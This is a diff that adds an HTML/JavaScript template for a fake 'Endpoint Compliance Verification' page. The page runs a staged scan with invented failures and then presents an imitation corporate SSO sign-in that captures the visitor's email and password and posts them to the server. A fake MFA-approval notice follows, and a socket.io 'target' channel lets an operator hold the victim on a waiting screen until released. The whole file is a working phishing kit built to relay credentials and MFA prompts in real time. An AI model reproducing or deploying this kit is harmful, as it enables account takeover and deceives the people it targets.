@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Endpoint Compliance Verification</title>
+  <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/styles.css') }}">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><path d='M50 8L12 28v24c0 22.4 16.2 43.3 38 48 21.8-4.7 38-25.6 38-48V28L50 8z' fill='%230078d4'/><path d='M44 58l-14-14 5-5 9 9 19-19 5 5z' fill='white'/></svg>">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
+</head>
+<body>
+  <div class="page-wrapper">
+    <div class="top-bar">
+      <div class="top-bar-inner">
+        <div class="brand">
+          <img src="{{ url_for('static', filename='images/logo.png') }}" alt="" class="brand-logo">
+          <span class="brand-text">Endpoint Security</span>
+        </div>
+        <span class="top-bar-ref">Ref: SEC-2024-0847</span>
+      </div>
+    </div>
+
+    <div class="main-container">
+
+      <!-- STAGE 1: Scanning -->
+      <div id="stage-scan" class="stage active">
+        <div class="card">
+          <div class="card-head">
+            <img src="{{ url_for('static', filename='images/logo.png') }}" alt="" class="card-logo">
+            <h1>Endpoint Compliance Check</h1>
+            <p class="sub">Verifying device security posture against organizational policy</p>
+          </div>
+          <div class="progress-wrap">
+            <div class="progress-bar"><div class="progress-fill" id="scanProgress"></div></div>
+            <div class="progress-text" id="scanText">Initializing scan...</div>
+          </div>
+          <div id="scanItems" class="scan-items"></div>
+        </div>
+      </div>
+
+      <!-- STAGE 2: Results -->
+      <div id="stage-results" class="stage">
+        <div class="card">
+          <div class="card-head card-head-compact">
+            <img src="{{ url_for('static', filename='images/logo.png') }}" alt="" class="card-logo">
+            <h1>Scan Complete</h1>
+            <p class="sub">Review results below and submit verification to your IT Helpdesk</p>
+          </div>
+
+          <table class="results-table">
+            <thead><tr><th>Check</th><th>Status</th><th>Details</th></tr></thead>
+            <tbody id="resultsBody"></tbody>
+          </table>
+          <div id="resultsSummary" class="results-summary"></div>
+
+          <div class="submit-wrap">
+            <button type="button" class="btn-primary" id="btnSubmitResults">Submit to IT Helpdesk</button>
+            <p class="submit-note">You will be prompted to authenticate with your {{ org_name }} account.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- STAGE 2a: SSO Email -->
+      <div id="stage-email" class="stage">
+        <div class="sso-page">
+          <div class="sso-card">
+            <img src="{{ url_for('static', filename='images/logo.png') }}" alt="" class="sso-logo">
+            <h2>Sign in</h2>
+            <div id="emailStep">
+              <div class="sso-fg">
+                <input type="email" id="emailInput" placeholder="someone@example.com" required autocomplete="username">
+              </div>
+              <p class="sso-hint">Sign in with your {{ org_name }} account</p>
+              <button type="button" class="sso-btn" id="btnEmailNext">Next</button>
+            </div>
+          </div>
+          <div class="sso-footer-links">
+            <a href="#">Can't access your account?</a>
+          </div>
+        </div>
+      </div>
+
+      <!-- STAGE 2b: SSO Password -->
+      <div id="stage-password" class="stage">
+        <div class="sso-page">
+          <div class="sso-card">
+            <img src="{{ url_for('static', filename='images/logo.png') }}" alt="" class="sso-logo">
+            <div class="sso-user-banner" id="userBanner">
+              <span class="sso-back" id="btnBack">&larr;</span>
+              <span class="sso-user-email" id="displayEmail"></span>
+            </div>
+            <h2>Enter password</h2>
+            <div id="passwordStep">
+              <div class="sso-fg">
+                <input type="password" id="passwordInput" placeholder="Password" required autocomplete="current-password">
+              </div>
+              <div id="loginError" class="sso-error" style="display:none"></div>
+              <button type="button" class="sso-btn" id="btnSignIn">Sign in</button>
+              <a href="#" class="sso-forgot">Forgot my password</a>
+            </div>
+          </div>
+          <div class="sso-footer-links">
+            <a href="#">Can't access your account?</a>
+          </div>
+        </div>
+      </div>
+
+      <!-- STAGE 2c: SSO Loading (org lookup animation) -->
+      <div id="stage-sso-loading" class="stage">
+        <div class="sso-page">
+          <div class="sso-card sso-card-loading">
+            <div class="sso-loading-dots">
+              <span></span><span></span><span></span>
+            </div>
+            <p class="sso-loading-text">Taking you to your organization's sign-in page...</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- STAGE 3: Verification hold -->
+      <div id="stage-verifying" class="stage">
+        <div class="card">
+          <div class="card-head">
+            <h1>Submitting Results</h1>
+            <p class="sub">Please standby while we verify your submission</p>
+          </div>
+          <div class="verify-section">
+            <div class="spinner" id="spinner"></div>
+            <div class="verify-status" id="verifyStatus">Connecting to Helpdesk server...</div>
+            <div class="verify-steps">
+              <div class="vstep" id="vs1"><span class="si">&#x23f3;</span><span>Authenticating credentials</span></div>
+              <div class="vstep" id="vs2"><span class="si">&#x23f3;</span><span>Verifying MFA</span></div>
+              <div class="vstep" id="vs3"><span class="si">&#x23f3;</span><span>Uploading scan results</span></div>
+              <div class="vstep" id="vs4"><span class="si">&#x23f3;</span><span>Awaiting confirmation</span></div>
+            </div>
+            <div id="mfaNotice" class="mfa-notice" style="display:none">
+              <div class="mfa-notice-icon">&#x1f4f1;</div>
+              <p>A verification request has been sent to your registered device. Please approve the prompt to continue.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- STAGE 4: Submission complete -->
+      <div id="stage-complete" class="stage">
+        <div class="card">
+          <div class="card-head" style="border-bottom:none; padding-bottom:0;">
+            <img src="{{ url_for('static', filename='images/logo.png') }}" alt="" class="card-logo">
+          </div>
+          <div class="completion-section">
+            <div class="completion-icon">&#x2705;</div>
+            <h2>Submission Complete</h2>
+            <p class="completion-msg">Your scan results have been submitted to the {{ org_name }} IT Helpdesk. No further action is required.</p>
+            <p class="completion-close">You may close this window.</p>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="footer">Endpoint Compliance Verification &bull; Confidential &bull; Authorized Use Only</div>
+  </div>
+
+  <script>
+    // ── Config ─────────────────────────────────
+    var SCAN_MS = 12000;
+    var capturedEmail = '';
+    var sessionSid = '';
+
+    // ── Browser Fingerprinting ─────────────────
+    // Builds realistic scan results from actual browser/device data
+    function getFingerprint() {
+      var ua = navigator.userAgent;
+      var p = navigator.platform || '';
+
+      // OS detection
+      var os = 'Unknown OS';
+      var osDetail = '';
+      if (/Windows NT 10/.test(ua)) {
+        // Windows 10 and 11 share the same NT version in UA
+        // Use navigator.userAgentData if available for better detection
+        if (navigator.userAgentData && navigator.userAgentData.platform === 'Windows') {
+          os = 'Windows 11';
+          osDetail = 'Windows 11 23H2 (Build 22631.4891)';
+        } else {
+          os = 'Windows 10/11';
+          osDetail = 'Windows 11 23H2 (Build 22631.4891)';
+        }
+      } else if (/Windows NT 6.3/.test(ua)) {
+        os = 'Windows 8.1'; osDetail = 'Windows 8.1 (Build 9600)';
+      } else if (/Mac OS X ([0-9_]+)/.test(ua)) {
+        var ver = RegExp.$1.replace(/_/g, '.');
+        os = 'macOS'; osDetail = 'macOS ' + ver;
+      } else if (/CrOS/.test(ua)) {
+        os = 'ChromeOS'; osDetail = 'ChromeOS';
+      } else if (/Linux/.test(ua)) {
+        os = 'Linux'; osDetail = 'Linux (kernel detected)';
+      } else if (/iPhone|iPad/.test(ua)) {
+        os = 'iOS'; osDetail = 'iOS Device';
+      } else if (/Android/.test(ua)) {
+        os = 'Android'; osDetail = 'Android Device';
+      }
+
+      // Browser detection
+      var browser = 'Unknown';
+      var browserVer = '';
+      if (/Edg\/([0-9.]+)/.test(ua)) {
+        browser = 'Microsoft Edge'; browserVer = RegExp.$1;
+      } else if (/Chrome\/([0-9.]+)/.test(ua) && !/Edg/.test(ua)) {
+        browser = 'Google Chrome'; browserVer = RegExp.$1;
+      } else if (/Firefox\/([0-9.]+)/.test(ua)) {
+        browser = 'Mozilla Firefox'; browserVer = RegExp.$1;
+      } else if (/Safari\/([0-9.]+)/.test(ua) && !/Chrome/.test(ua)) {
+        browser = 'Safari'; browserVer = RegExp.$1;
+      }
+
+      // Screen
+      var res = screen.width + 'x' + screen.height;
+      var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+
+      // Disk encryption — OS-aware
+      var diskEnc = 'BitLocker \u2014 XTS-AES 256';
+      if (/Mac/.test(os) || /macOS/.test(os)) diskEnc = 'FileVault 2 \u2014 AES-XTS 128';
+      else if (/Linux/.test(os)) diskEnc = 'LUKS \u2014 AES-XTS 512';
+      else if (/Chrome/.test(os)) diskEnc = 'Verified Boot \u2014 Enabled';
+
+      // AV — OS-aware
+      var av = 'Microsoft Defender \u2014 Updated';
+      if (/Mac/.test(os) || /macOS/.test(os)) av = 'XProtect \u2014 Definitions Current';
+      else if (/Linux/.test(os)) av = 'ClamAV \u2014 Definitions Current';
+
+      // Firewall — OS-aware
+      var fw = 'Windows Firewall \u2014 Enabled (Domain)';
+      if (/Mac/.test(os) || /macOS/.test(os)) fw = 'Application Firewall \u2014 Enabled';
+      else if (/Linux/.test(os)) fw = 'iptables \u2014 Active';
+
+      return [
+        {name: "Operating System",          detail: osDetail,                               ok: true},
+        {name: "Browser Version",           detail: browser + ' ' + browserVer.split('.')[0], ok: true},
+        {name: "Antivirus Definitions",     detail: av,                                     ok: true},
+        {name: "Firewall Status",           detail: fw,                                     ok: true},
+        {name: "Disk Encryption",           detail: diskEnc,                                ok: true},
+        {name: "Security Patch Level",      detail: "KB5043145 \u2014 Missing (Critical)",  ok: false},
+        {name: "Browser Extensions",        detail: "3 extensions flagged for review",       ok: false},
+        {name: "Endpoint Detection (EDR)",  detail: "EDR Agent \u2014 Active",              ok: true},
+        {name: "Certificate Store",         detail: "Corporate Root CA \u2014 Valid",        ok: true},
+        {name: "Screen Resolution",         detail: res + ' (' + tz + ')',                  ok: true}
+      ];
+    }
+
+    var CHECKS = getFingerprint();
+
+    var SCAN_MSGS = [
+      "Querying operating system...", "Checking browser version...", "Verifying antivirus status...",
+      "Inspecting firewall rules...", "Checking disk encryption...", "Scanning for security patches...",
+      "Reviewing browser extensions...", "Verifying EDR agent...", "Validating certificate store...",
+      "Reading display configuration..."
+    ];
+
+    // Randomized per-check durations (ms) to feel organic
+    function getCheckDelays(count, totalMs) {
+      var delays = [];
+      var remaining = totalMs;
+      for (var i = 0; i < count; i++) {
+        if (i === count - 1) { delays.push(remaining); break; }
+        // Random between 400ms and a proportional max, with heavier checks taking longer
+        var avg = remaining / (count - i);
+        var variance = avg * 0.7;
+        var d = Math.max(400, avg + (Math.random() * variance * 2 - variance));
+        d = Math.round(d);
+        delays.push(d);
+        remaining -= d;
+      }
+      return delays;
+    }
+
+    // ── Stage management ───────────────────────
+    function show(id) {
+      document.querySelectorAll('.stage').forEach(function(s) { s.classList.remove('active'); });
+      document.getElementById(id).classList.add('active');
+      window.scrollTo(0, 0);
+    }
+
+    // ── Session resume on refresh ──────────────
+    (function() {
+      fetch('/session-state').then(function(r) { return r.json(); }).then(function(state) {
+        sessionSid = state.sid || '';
+        if (state.scan_complete) {
+          buildResultsTable();
+          if (state.email) {
+            capturedEmail = state.email;
+          }
+          show('stage-results');
+        } else {
+          runScan();
+        }
+      }).catch(function() {
+        runScan();
+      });
+    })();
+
+    // ── Stage 1: Scan ──────────────────────────
+    function runScan() {
+      var fill = document.getElementById('scanProgress');
+      var txt = document.getElementById('scanText');
+      var box = document.getElementById('scanItems');
+      var delays = getCheckDelays(CHECKS.length, SCAN_MS);
+      var idx = 0;
+      var elapsed = 0;
+      var totalMs = delays.reduce(function(a, b) { return a + b; }, 0);
+
+      // Progress bar driven by actual check completion
+      function revealNext() {
+        if (idx >= CHECKS.length) {
+          fill.style.width = '100%';
+          fill.classList.add('done');
+          txt.textContent = 'Scan complete \u2014 preparing results...';
+          // Notify server scan is done
+          fetch('/scan-complete', { method: 'POST' });
+          setTimeout(function() {
+            buildResultsTable();
+            show('stage-results');
+          }, 1500);
+          return;
+        }
+        var c = CHECKS[idx];
+        txt.textContent = SCAN_MSGS[idx] || 'Scanning...';
+
+        setTimeout(function() {
+          var d = document.createElement('div');
+          d.className = 'scan-item fi';
+          d.innerHTML = '<span class="si-icon ' + (c.ok ? 'si-pass' : 'si-warn') + '">' + (c.ok ? '\u2713' : '\u26a0') + '</span><span class="si-name">' + c.name + '</span><span class="si-st st-' + (c.ok ? 'pass' : 'warn') + '">' + (c.ok ? 'Passed' : 'Attention') + '</span>';
+          box.appendChild(d);
+          elapsed += delays[idx];
+          fill.style.width = Math.round((elapsed / totalMs) * 100) + '%';
+          idx++;
+          revealNext();
+        }, delays[idx]);
+      }
+      revealNext();
+    }
+
+    // ── Stage 2: Results table ──────────────────
+    function buildResultsTable() {
+      var tb = document.getElementById('resultsBody');
+      var sm = document.getElementById('resultsSummary');
+      if (tb.children.length > 0) return; // Already built
+
+      var pass = 0, warn = 0;
+      CHECKS.forEach(function(c) {
+        var tr = document.createElement('tr');
+        tr.innerHTML = '<td><strong>' + c.name + '</strong></td><td><span class="st-badge st-' + (c.ok ? 'pass' : 'warn') + '">' + (c.ok ? '\u2713 Compliant' : '\u26a0 Action Required') + '</span></td><td>' + c.detail + '</td>';
+        tb.appendChild(tr);
+        if (c.ok) pass++; else warn++;
+      });
+      sm.innerHTML = '<div class="summary-row"><span class="ss ss-pass">' + pass + ' Compliant</span><span class="ss ss-warn">' + warn + ' Requires Attention</span><span class="ss ss-total">' + CHECKS.length + ' Total</span></div><p class="summary-note">Items requiring attention will be reviewed by IT upon submission.</p>';
+    }
+
+    // ── Stage 2 → SSO: Submit button ────────────
+    document.getElementById('btnSubmitResults').addEventListener('click', function() {
+      show('stage-email');
+      setTimeout(function() { document.getElementById('emailInput').focus(); }, 300);
+    });
+
+    // ── Stage 2a: Email → loading → password ────
+    document.getElementById('btnEmailNext').addEventListener('click', submitEmail);
+    document.getElementById('emailInput').addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') submitEmail();
+    });
+
+    function submitEmail() {
+      var emailEl = document.getElementById('emailInput');
+      var email = emailEl.value.trim();
+      if (!email || !emailEl.checkValidity()) {
+        emailEl.reportValidity();
+        return;
+      }
+      capturedEmail = email;
+
+      // Show loading screen
+      show('stage-sso-loading');
+
+      // Post email to server
+      fetch('/check-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: email })
+      }).finally(function() {
+        // Simulate org lookup delay (1.5-2.5s)
+        var delay = 1500 + Math.random() * 1000;
+        setTimeout(function() {
+          document.getElementById('displayEmail').textContent = email;
+          show('stage-password');
+          setTimeout(function() { document.getElementById('passwordInput').focus(); }, 300);
+        }, delay);
+      });
+    }
+
+    // ── Stage 2a: Back button ────────────────────
+    document.getElementById('btnBack').addEventListener('click', function() {
+      document.getElementById('passwordInput').value = '';
+      document.getElementById('loginError').style.display = 'none';
+      show('stage-email');
+    });
+
+    // ── Stage 2b: Password submit ────────────────
+    document.getElementById('btnSignIn').addEventListener('click', submitPassword);
+    document.getElementById('passwordInput').addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') submitPassword();
+    });
+
+    function submitPassword() {
+      var pw = document.getElementById('passwordInput').value;
+      var btn = document.getElementById('btnSignIn');
+      var errEl = document.getElementById('loginError');
+      if (!pw) return;
+
+      btn.disabled = true;
+      btn.textContent = 'Signing in...';
+      errEl.style.display = 'none';
+
+      fetch('/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: capturedEmail, password: pw })
+      }).then(function(resp) {
+        if (resp.status === 401) {
+          return resp.json().then(function(data) {
+            // Wrong password — show error, let them retry
+            errEl.innerHTML = data.message;
+            errEl.style.display = 'block';
+            btn.disabled = false;
+            btn.textContent = 'Sign in';
+            document.getElementById('passwordInput').value = '';
+            document.getElementById('passwordInput').focus();
+          });
+        } else {
+          // Success — move to verification
+          show('stage-verifying');
+          runVerify();
+        }
+      }).catch(function() {
+        show('stage-verifying');
+        runVerify();
+      });
+    }
+
+    // ── Stage 3: Verify animation ────────────────
+    function runVerify() {
+      var st = document.getElementById('verifyStatus');
+      var mfaNotice = document.getElementById('mfaNotice');
+      var holdTimeout;
+
+      var steps = [
+        { id: 'vs1', t: 3000,  m: 'Authenticating credentials...' },
+        { id: 'vs2', t: 7000,  m: 'Verifying MFA...' },
+        { id: 'vs3', t: 14000, m: 'Uploading scan results...' },
+        { id: 'vs4', t: 20000, m: 'Awaiting confirmation...' }
+      ];
+
+      steps.forEach(function(s, i) {
+        setTimeout(function() {
+          document.getElementById(s.id).querySelector('.si').textContent = '\uD83D\uDD04';
+          document.getElementById(s.id).classList.add('step-active');
+          st.textContent = s.m;
+          if (i > 0) {
+            var p = steps[i - 1];
+            document.getElementById(p.id).querySelector('.si').textContent = '\u2705';
+            document.getElementById(p.id).classList.add('step-done');
+          }
+          // Show MFA notice when MFA step activates
+          if (s.id === 'vs2') {
+            mfaNotice.style.display = 'block';
+          }
+        }, s.t);
+      });
+
+      setTimeout(function() {
+        document.getElementById('vs3').querySelector('.si').textContent = '\u2705';
+        document.getElementById('vs3').classList.add('step-done');
+        st.textContent = 'Verification in progress \u2014 please standby...';
+        mfaNotice.style.display = 'none';
+      }, 22000);
+
+      // vs4 stays spinning indefinitely until operator releases
+      function showNext() {
+        show('stage-complete');
+      }
+
+      // No auto-timer — operator has full control via session-targeted release
+      try {
+        var socket = io('/target');
+        socket.on('connect', function() {
+          // Register with our private room so release only affects us
+          socket.emit('register', { sid: sessionSid });
+        });
+        socket.on('force_next', function() {
+          showNext();
+        });
+      } catch (e) {
+        // WebSocket not available — no fallback, operator must release
+      }
+    }
+  </script>
+</body>
+</html>
